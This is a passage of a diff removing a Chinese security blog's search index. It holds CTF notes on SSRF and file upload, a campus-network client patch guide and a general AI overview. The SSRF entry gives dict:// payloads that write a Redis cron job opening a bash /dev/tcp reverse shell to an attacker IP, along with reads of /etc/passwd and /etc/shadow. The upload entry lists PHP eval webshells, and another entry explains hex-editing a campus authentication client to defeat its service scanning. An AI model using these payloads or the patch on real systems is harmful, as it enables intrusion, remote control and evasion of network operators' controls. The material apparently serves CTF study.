-<p><strong>判断漏洞是否存在：</strong>在目标网站上攻击者IP，如果攻击的服务器日志能看到目标服务器对自己发起的请求，说明存在漏洞。</p>
-<h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><h3 id="1-读取敏感文件"><a href="#1-读取敏感文件" class="headerlink" title="1. 读取敏感文件"></a>1. 读取敏感文件</h3><p>**file协议:**本地文件传输协议，用于访问本地计算机中的文件。好比通过Windows的资源管理器中打开文件或者通过右键单击打开一样。格式:file:&#x2F;&#x2F;filepath</p>
-<p><strong>重要文件：</strong></p>
-<ol>
-<li>&#x2F;etc&#x2F;passwd:在Linux中，&#x2F;etc&#x2F;passwd文件中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段:<code>用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录 shell</code></li>
-<li>&#x2F;etc&#x2F;shadow:用于存储 Linux 系统中用户的密码信息，只有 root 用户拥有读权限，其他用户没有任何权限。</li>
-<li>&#x2F;etc&#x2F;hosts:在linux中，主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。可以用文本文件打开!当用户在浏览器中输入一个网址时，系统会首先自动从hosts文件中寻找对应的IP地址，一旦找到，浏览器会立即打开对应网页，如果没有找到，则浏览器会将网址提交DNS服务器进行IP地址解析。</li>
-</ol>
-<h3 id="2-探测内网服务"><a href="#2-探测内网服务" class="headerlink" title="2. 探测内网服务"></a>2. 探测内网服务</h3><p>**dict协议:**一个字典服务器协议，在ssrf中常用于探测日标服务器端口上运行的服务版本信息。格式:dict:&#x2F;&#x2F;ip:port。先利用file协议读取&#x2F;etc&#x2F;hosts获取ip，通过 dict 协议读取目标服务器端口上运行的服务版本信息</p>
-<p>探测内网存活IP和开放端口:可利用BurpSuite，批量探测存活IP和开放端口。</p>
-<ol>
-<li><p>开启Burpsuite，并访问待测试的网站:<a class="link"   href="http://120.27.61.239:8006/source/index.php" >http://120.27.61.239:8006/source/index.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>;</p>
-</li>
-<li><p>将抓到的包发送到Intruder模块，设置IP或者端口，进行爆破;</p>
-</li>
-</ol>
-<p><strong>探测内网redis：</strong>REmote Dlctionary Server(Redis)是一个由 Salvatore Sanfilippo 写的 key-value 存储系统，是跨平台的非关系型数据库。Redis一般绑定在本地(不允许远程访问)，默认不开启认证，默认端口为6379。如果在没有开启认证的情况下，可以导致任意用户利用ssrf漏洞攻击内网中的未授权Redis以及读取Redis的数据。使用dict:&#x2F;&#x2F;127.0.0.1:6379 有返回信息，说明存在redis数据库</p>
-<p>同样可以利用Burp进行爆破</p>
-<h3 id="3-攻击内网应用"><a href="#3-攻击内网应用" class="headerlink" title="3. 攻击内网应用"></a>3. 攻击内网应用</h3><p>攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，如果运行redis 的用户是root 用户，攻击者可以通过写<strong>定时任务</strong>的方式进行反弹shell。<br>定时任务类似日常生活之中的闹钟，主要用于定时执行某些命令，达到定时处理数据的作用。不同的系统定时任务保存位置不一样，比如:<br>centos(cat &#x2F;etc&#x2F;redhat-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;日录下;<br>ubuntu(cat &#x2F;etc&#x2F;lsb-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 目录下。</p>
-<p><strong>攻击payload:</strong></p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dict://127.0.0.1:6379/info //查看信息</span><br><span class="line">dict://127.0.0.1:6379/flusha11 //清空数据库(慎用)</span><br><span class="line">dict://127.0.0.1:6379/config set dir /var/spoo1/cron/ //设置工作目录</span><br><span class="line">dict://127.0.0.1:6379/config set dbfilename root //设置备份文件名</span><br><span class="line">dict://127.0.0.1:6379/set x &quot;\n***** bash -i &amp;&gt; /dev/tcp/攻击机IP/port 0&gt;&amp;1\n&quot;//反弹she11</span><br><span class="line">dict://127.0.0.1:6379/save</span><br></pre></td></tr></table></figure></div>
-
-<p>然后攻击机进行监听</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure></div>
-
-<p>定时任务执行后就会反弹shell到攻击机</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>SSRF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传</title>
-    <url>/2024/09/11/776247657efa/</url>
-    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>一句话木马</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>解决JNU某捷有线校园网关闭虚拟机网络服务</title>
-    <url>/2024/09/21/7d3ba1c32839/</url>
-    <content><![CDATA[<p><em><strong>免责声明：本文只作JNU锐捷校园网认证的经验分享，其他学校的校园网是否适用请自行尝试，所有后果与作者无关！</strong></em></p>
-<p><strong>注意：此方法只适用于虚拟机网络使用NAT连接。</strong></p>
-<p>首先我们先要知道为什么校园网会自动关闭虚拟机的NAT网络，说白了就是扫你服务是否开启，如果你的NAT服务开启，他就给你关闭。所以我们解决这个问题就要找到他的扫描在哪里。</p>
-<p>首先先按照以下方法来操作，你最后就会知道原理。先卸载你之前的校园网，并且把文件夹里的文件删除干净。</p>
-<p>首先需要做好准备，下载一个可以查看字节的软件，比如010editor、PEview、UltraEdit等。这里我们采用UltraEdit。相关软件请自行搜索下载。</p>
-<p>然后下载校园网认证的<a href="">安装包</a>进行安装。选择安装路径。然后点击立即安装。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211845185.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854110.png"
-                      alt="image-20240921185459092"
-                ></p>
-<h4 id="注意：这里安装完成后不要点击完成安装！！！！"><a href="#注意：这里安装完成后不要点击完成安装！！！！" class="headerlink" title="注意：这里安装完成后不要点击完成安装！！！！"></a>注意：这里安装完成后不要点击完成安装！！！！</h4><p>然后我们打开校园网安装路径的根目录，找到8021x.exe，这个exe文件其实就是扫描你的服务的，当你认证了校园网后，这个服务也会在后台运行，并且这个程序是关不了的，关了你的校园网也没了，所以很ex。。并且当你完成安装后，这个exe文件也就绑定了，无法更改（更改后会自动还原）。但是你没有点完成安装，这个文件就是可修改的。这就是原理。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854775.png"
-                      alt="image-20240921185425761"
-                ></p>
-<p>然后我们打开UltraEdit，把这个文件拖入到UltraEdit。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211856159.png"
-                      alt="image-20240921185659129"
-                ></p>
-<p>然后按住键盘的ctrl+f，进行搜索：<code>VMware NAT Service</code>，然后这里把这个字节改了就行，随便改，这里我把<code>VMware</code>改成了<code>VWware</code>。然后更改完成后按ctrl+s进行保存，这里就完成了，关闭UltraEdit。然后点击完成安装.</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211910081.png"
-                      alt="image-20240921191031242"
-                ></p>
-<p>这里就完成了，登陆校园网后，按住ctrl+shift+esc，打开任务管理器，点开服务，搜索NAT，然后右键启动VMware NAT Service，就会发现，这个服务不会被自动关闭了，虚拟机就可以正常上网了。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211911440.png"
-                      alt="image-20240921191124399"
-                ></p>
-]]></content>
-      <categories>
-        <category>common</category>
-      </categories>
-      <tags>
-        <tag>common</tag>
-        <tag>校园网</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>人工智能简介</title>
-    <url>/2024/09/21/efcce1b0a0d3/</url>
-    <content><![CDATA[<h1 id="人工智能简介"><a href="#人工智能简介" class="headerlink" title="人工智能简介"></a>人工智能简介</h1><p>​		在21世纪的科技浪潮中，人工智能（AI）已成为推动社会进步的强大引擎。从智能手机的智能助手到医疗诊断的精准算法，再到自动驾驶汽车的复杂决策系统，人工智能正以前所未有的速度渗透到我们生活的方方面面。它不仅仅是冷冰冰的代码和算法，更是人类智慧的延伸，它学习、适应并模仿我们的行为，以提高效率、优化决策并增强我们的体验。</p>
-<p>​		人工智能的核心在于其学习能力——通过分析大量数据，识别模式，预测未来趋势，并在不断的迭代中自我优化。这种能力使得AI能够执行各种任务，从简单的自动化工作到复杂的创造性思维，无所不包。</p>
-<p>​		然而，人工智能的发展也带来了一系列挑战和伦理问题，包括隐私保护、数据安全、就业影响以及决策的透明度和公平性。这些挑战要求我们不仅要关注技术的进步，还要深入思考如何确保人工智能的发展能够惠及所有人，同时尊重每个人的权益。</p>
-<p>​		在这篇文章中，我们将深入探讨人工智能的工作原理、应用场景、发展趋势以及它对社会的深远影响。我们将一起见证人工智能如何塑造未来，以及我们如何在这个过程中扮演积极的角色。</p>
-<h3 id="国家对人工智能的规划"><a href="#国家对人工智能的规划" class="headerlink" title="国家对人工智能的规划"></a>国家对人工智能的规划</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211134678.png"
-                      alt="image-20240921113456610"
-                ></p>
-<p>​		《规划》提出六个方面重点任务：一是构建开放协同的人工智能科技创新体系，从前沿基础理论、关键共性技术、创新平台、高端人才队伍等方面强化部署。二是培育高端高效的智能经济，发展人工智能新兴产业，推进产业智能化升级，打造人工智能创新高地。三是建设安全便捷的智能社会，发展高效智能服务，提高社会治理智能化水平，利用人工智能提升公共安全保障能力，促进社会交往的共享互信。四是加强人工智能领域军民融合，促进人工智能技术军民双向转化、军民创新资源共建共享。五是构建泛在安全高效的智能化基础设施体系，加强网络、大数据、高效能计算等基础设施的建设升级。六是前瞻布局重大科技项目，针对新一代人工智能特有的重大基础理论和共性关键技术瓶颈，加强整体统筹，形成以新一代人工智能重大科技项目为核心、统筹当前和未来研发任务布局的人工智能项目群。</p>
-<h3 id="人工智能市场行情"><a href="#人工智能市场行情" class="headerlink" title="人工智能市场行情"></a>人工智能市场行情</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211200240.png"
-                      alt="image-20240921115627854"
-                ></p>
-<p>​		随着人工智能技术不断演进，人工智能已应用到人们日常生产、生活的方方面面。与此同时，人工智能风险引起普遍担忧，因此，对于安全可信人工智能技术的需要已经提升到前所未有的高度，推动人工智能可靠可控的发展成为全球共识。另一方面，随着传统行业数字化进程的提升，将提供海量的数据和丰富的应用场景，为人工智能的应用打开新的空间，使得其与社会各方面进一步融合。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211200320.png"
-                      alt="image-20240921115530880"
-                ></p>
-<h3 id="人工智能教材进高中"><a href="#人工智能教材进高中" class="headerlink" title="人工智能教材进高中"></a>人工智能教材进高中</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211202609.png"
-                      alt="a39b52b96dcbcf0b44f345c9ac7413c"
-                ></p>
-<p>​		《人工智能基础（高中版）》教材由华东师范大学慕课中心、商汤科技、上海知名高中优秀教师共同编著。华东师大二附中、上海交通大学附中、清华大学附属中学、上海市市西中学等40所全国学校成为首批“人工智能教育实验基地校”。这是国内中等教育体系首次引入AI教材，人工智能教育在中国正式迈入基础教育阶段。由此人工智能这一当今最前沿的高新技术将走出“象牙塔”，成为每一个在校高中生都可以掌握的基本技能。</p>
-<p>​		本书是面向高中学生的教材，讲授人工智能的发展历史、基本概念以及实际应用，使学生理解人工智能的基本原理，特别是数据、算法与应用之间的相互关系。并结合常见的应用场景，理解人工智能技术（包括感知与决策）的基本工作方式，通过动手实践，更深入地理解人工智能技术的原理、能力，以及在实用中面临的挑战。本书强调人工智能基本理念与原理的传递，注重创造力、想象力、整体思考，以及动手能力的提升。</p>
-<h3 id="人工智能——对话聊天"><a href="#人工智能——对话聊天" class="headerlink" title="人工智能——对话聊天"></a>人工智能——对话聊天</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211206946.png"
-                      alt="image-20240921120619742"
-                ></p>
-<p>​		GPT-4o 的问世再次惊艳了世界，本文深入探讨了 GPT-4o 在语音交互领域的突破性进展，揭示了其在即时性和表现力方面的优势，并对实现这一技术所面临的挑战进行了详细分析。除此之外，作者还对 OpenAI 的发展策略进行了评估，指出了 GPT-4 在逻辑严密性和上下文处理能力上的局限性，并对未来 GPT-5 的发展方向和潜在挑战提出了见解。</p>
-<h3 id=""><a href="#" class="headerlink" title=""></a><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211207350.png"
-                      alt="image-20240921120750291"
-                ></h3><p>​		Siri 是 Speech Interpretation &amp; Recognition Interface 的首字母缩写，原义为<a class="link"   href="https://baike.baidu.com/item/%E8%AF%AD%E9%9F%B3%E8%AF%86%E5%88%AB/10927133?fromModule=lemma_inlink" >语音识别 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>接口，是苹果公司在iPhone、iPad、iPod Touch、HomePod、Apple Watch、Apple TV、Apple CarPlay等产品上应用的一个语音助手，利用Siri用户可以通过手机查找信息、拨打电话、发送信息、获取路线、播放音乐、查找苹果设备等。 </p>
-<p>​		Siri可以支持自然语言输入，并且可以调用系统自带的天气预报、搜索资料等应用，还能够不断学习新的声音和语调，提供对话式的应答。Siri可以令iPhone4S及以上手机（iPad 3以上平板）变身为一台智能化机器人。</p>
-<blockquote>
-<p>以上来自百度百科</p>
-</blockquote>
-<h3 id="人工智能——无人驾驶"><a href="#人工智能——无人驾驶" class="headerlink" title="人工智能——无人驾驶"></a>人工智能——无人驾驶</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211216062.png"
-                      alt="051c228ca721d73099b027b542dba62"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211216030.png"
-                      alt="2a0b25da46151059a2dc6643474901f"
-                ></p>
-<p><a class="link"   href="https://baike.baidu.com/item/%E6%B1%BD%E8%BD%A6%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6/0?fromModule=lemma_inlink" >		汽车自动驾驶 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>技术包括<a class="link"   href="https://baike.baidu.com/item/%E8%A7%86%E9%A2%91%E6%91%84%E5%83%8F%E5%A4%B4/0?fromModule=lemma_inlink" >视频摄像头 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>、雷达传感器以及<a class="link"   href="https://baike.baidu.com/item/%E6%BF%80%E5%85%89%E6%B5%8B%E8%B7%9D%E5%99%A8/0?fromModule=lemma_inlink" >激光测距器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>来了解周围的交通状况，并通过一个详尽的地图（通过有人驾驶汽车采集的地图）对前方的道路进行<a class="link"   href="https://baike.baidu.com/item/%E5%AF%BC%E8%88%AA/7741941?fromModule=lemma_inlink" >导航 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。这一切都通过谷歌的数据中心来实现，谷歌的数据中心能处理汽车收集的有关周围地形的大量信息。就这点而言，自动驾驶汽车相当于谷歌数据中心的<a class="link"   href="https://baike.baidu.com/item/%E9%81%A5%E6%8E%A7%E6%B1%BD%E8%BD%A6/0?fromModule=lemma_inlink" >遥控汽车 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>或者<a class="link"   href="https://baike.baidu.com/item/%E6%99%BA%E8%83%BD%E6%B1%BD%E8%BD%A6/4771107?fromModule=lemma_inlink" >智能汽车 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。汽车自动驾驶技术<a class="link"   href="https://baike.baidu.com/item/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF/83253?fromModule=lemma_inlink" >物联网技术 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>应用之一。</p>
-<p>沃尔沃根据自动化水平的高低区分了四个无人驾驶的阶段：驾驶辅助、部分自动化、高度自动化、完全自动化。</p>
-<p><a href="https://baike.baidu.com/pic/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%B1%BD%E8%BD%A6/4881925/0/faedab64034f78f014f7bc5679310a55b2191c92?fr=lemma&fromModule=lemma_content-image"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211219450.jpeg"
-                      alt="img"
-                ></a>谷歌自动驾驶汽车示意图</p>
-<p>1、<strong>驾驶辅助系统（DAS）：</strong>目的是为驾驶者提供协助，包括提供重要或有益的驾驶相关信息，以及在形势开始变得危急的时候发出明确而简洁的警告。如“车道偏离警告”（LDW）系统等。</p>
-<p>2、<strong>部分自动化系统：</strong>在驾驶者收到警告却未能及时采取相应行动时能够自动进行干预的系统，如“自动紧急制动”（AEB）系统和“应急车道辅助”（ELA）系统等。</p>
-<p>3、<strong>高度自动化系统：</strong>能够在或长或短的时间段内代替驾驶者承担操控车辆的职责，但是仍需驾驶者对驾驶活动进行监控的系统。</p>
-<p>4、<strong>完全自动化系统：</strong>可无人驾驶车辆、允许车内所有乘员从事其他活动且无需进行监控的系统。这种自动化水平允许乘从事计算机工作、休息和睡眠以及其他娱乐等活动。 [22]</p>
-<blockquote>
-<p>以上来自百度百科</p>
-</blockquote>
-<h3 id="人工智能——形体机器人"><a href="#人工智能——形体机器人" class="headerlink" title="人工智能——形体机器人"></a>人工智能——形体机器人</h3><p>​		人型机器人<strong>（英语：Android），又称</strong>仿生人<strong>，音译</strong>安卓<strong>，是一种旨在模仿<a class="link"   href="https://baike.baidu.com/item/%E4%BA%BA%E7%B1%BB/31910?fromModule=lemma_inlink" >人类 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>外观和行为的<a class="link"   href="https://baike.baidu.com/item/%E6%9C%BA%E5%99%A8%E4%BA%BA/888?fromModule=lemma_inlink" >机器人 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（robot）尤其特指具有和人类相似肌体的种类。直到最近，</strong>人型机器人**的概念还主要停留在科学幻想领域，常见于电影、电视、漫画、小说等。机器人学方面的进展已经可以设计出功能化拟真化的人形机器人（humanoid robot）。</p>
-<p>​		仿生人拟真的程度有很多，有些可以从外观上识别，也没有真人的思想和感情。反过来说亦有开发外观不似人，但能够有似真人行为的机器人，如2001年<a class="link"   href="https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BD/125486?fromModule=lemma_inlink" >美国 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><a class="link"   href="https://baike.baidu.com/item/%E9%BA%BB%E7%9C%81%E7%90%86%E5%B7%A5%E5%AD%A6%E9%99%A2/117999?fromModule=lemma_inlink" >麻省理工学院 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>研发了号称世界上第一个有类似人类<a class="link"   href="https://baike.baidu.com/item/%E6%84%9F%E6%83%85/236277?fromModule=lemma_inlink" >感情 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的机器人。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211221651.gif"
-                      alt="img"
-                ></p>
-<blockquote>
-<p>来源：Boston Dynamics</p>
-</blockquote>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211222539.gif"
-                      alt="img"
-                ></p>
-<blockquote>
-<p>来源：Boston Dynamics</p>
-</blockquote>
-<p>​		机器人展示的酷炫的反向蟹腿技巧。当前大多数工业机器人在出现故障时都需要人工干预，如果机器人跌倒可以自己重新站起来，那么故障的人工干预就会少一些。另一方面，机器人可以通过这个动作简单地掸掉身上的灰尘并重新开始工作，这将给生产力带来大幅提升。</p>
-<h3 id="人工智能——游戏革命"><a href="#人工智能——游戏革命" class="headerlink" title="人工智能——游戏革命"></a>人工智能——游戏革命</h3><p>​		游戏制作公司也全面拥抱AI技术，用AI赋能内容制作工具，不断提升内容研发效率。以腾讯为例，腾讯AI Lab 在GDC 2024 重磅发布了自研游戏全生命周期AI引擎“GiiNEX”，该引擎借助腾讯自研生成式AI和决策AI模型，面向AI驱动的NPC、场景制作、内容生成等领域，可提供包括3D图形、动画、城市及音乐等多种AIGC能力。在GiiNEX引擎助力下，原本需要5天才能完成的城市建模任务，现在只需要25分钟即可完成，效率提升达百倍</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211224206.png"
-                      alt="img"
-                ></p>
-<blockquote>
-<p>来源：腾讯网</p>
-</blockquote>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211227624.gif"
-                      alt="WeiXunLian.gif"
-                ></p>
-<blockquote>
-<p>来源：Tencent-github-aitest 平台</p>
-</blockquote>
-<p>aitest平台 是一个基于游戏图像来开发游戏AI的开源工具包。工具包主要完成了UI检测，游戏内元素识别，AI算法(DQN，IM)等功能。可以基于这个工具包完成游戏自动化测试。目前已支持的游戏类型有跑酷类，吃鸡类，射击类，MOBA类等。</p>
-<h3 id="人工智能——人脸识别"><a href="#人工智能——人脸识别" class="headerlink" title="人工智能——人脸识别"></a>人工智能——人脸识别</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211232230.jpeg"
-                      alt="智能化人脸识别情绪管理考勤机将有希望替代人工考勤"
-                ></p>
-<p>​		这张图片展示了人类面部的多个关键部位，包括嘴唇、眉毛、下巴、眼睛等，以及与之相关的基本表情动作，如嘴唇的吸吮、眼睑的紧缩、下巴的抬起等。这些动作不仅构成了我们日常交流的基础，也是我们表达情感状态的重要方式。</p>
-<p>​		图片中还标注了六种基本情绪：平静（CALM）、悲伤（SADNESS）、惊讶（SURPRISE）、愤怒（ANGER）、恐惧（FEAR）和喜悦（JOY）。这些情绪是人类情感的普遍表达，人工智能通过分析这些面部表情来识别和理解人类的情绪状态。</p>
-<p>​		在人工智能领域，这种对面部表情的分析被称为情感识别技术。它利用计算机视觉和机器学习算法来识别和解释人类面部表情，进而推断出个体的情绪。这项技术在多个领域都有广泛的应用，包括心理健康监测、客户服务体验优化、娱乐互动以及安全监控等。</p>
-<p>​		通过这张图片，我们不仅能够直观地看到人工智能如何捕捉和分析人类表情，还能够理解这些技术如何帮助机器更好地与人类互动，提供更加个性化和富有同理心的服务。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211232777.png"
-                      alt="人脸识别原理介绍方案_炫群_展馆设计施工_展示空间创意_数字视觉_北京炫群科技有限公司"
-                ></p>
-<p>​		在人工智能的广泛应用中，面部识别技术正日益成为安全监控和人群管理的关键工具。这张图片展示了一个先进的面部识别系统在远距离工作时的场景，它能够识别并区分多个面孔，无论他们是否正对着摄像头。这种技术的应用场景包括但不限于公共安全、零售环境和企业安全。</p>
-<p>​		图片中标注了几个不同的个体，包括“Ben-客人”、“Tom-VIP”、“Ryan-嫌疑人”、“Peter-员工”、“Kim-员工”、“Lee-客人”和“Sarah-扒手”。这些标签表明系统能够根据预先设定的数据库识别个体的身份，并可能触发相应的安全措施或服务响应。例如，VIP客户可能会自动获得优先服务，而嫌疑人的出现可能会触发警报。</p>
-<p>​		此外，图片还强调了系统在处理不同角度的面孔和在低分辨率情况下工作的能力。特别是提到了“两眼间距离为22像素”，这表明即使在图像质量不佳的情况下，系统也能够准确地识别和分析面部特征。</p>
-<h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><p>​		随着人工智能技术的飞速发展，我们见证了它在各个领域的深远影响。从国家层面的规划到市场的繁荣，人工智能已经成为推动社会进步的关键力量。它不仅改变了我们的工作方式，更在教育领域发挥着重要作用，如将人工智能教材引入高中，培养未来的创新者和思想领袖。</p>
-<p>​		在日常生活中，人工智能的应用更是无处不在。无论是通过对话聊天机器人提供便捷的信息服务，还是通过无人驾驶技术革新交通出行，人工智能都在不断改善我们的生活质量。形体机器人的引入，更是将人工智能的触角延伸到了物理世界，它们在工业、医疗、服务等多个领域展现出巨大的潜力。</p>
-<p>​		游戏领域也因人工智能而焕发新生，它不仅提升了游戏体验，更推动了游戏设计的创新。人脸识别技术的应用，则在安全监控、个性化服务等方面展现出了巨大的价值。</p>
-<p>​		人工智能的浪潮已经到来，它正以前所未有的速度改变着我们的世界。随着技术的不断进步和应用的不断拓展，我们有理由相信，人工智能将继续引领未来的科技革命，为人类社会带来更多的便利和可能。</p>
-<p>​		让我们携手并进，共同迎接人工智能带来的无限可能，探索它为我们打开的新世界。</p>
-]]></content>
-      <categories>
-        <category>AI</category>
-        <category>common</category>
-      </categories>
-      <tags>
-        <tag>AI</tag>
       </tags>
   </entry>
 </search>
